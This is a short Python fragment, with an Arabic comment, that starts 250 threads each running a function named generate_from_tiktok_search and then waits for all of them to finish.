for i in range(250):
    t = Thread(target=generate_from_tiktok_search)
    threads.append(t)
    t.start()

# انتظار انتهاء جميع المعالجات
for t in threads:
    t.join()
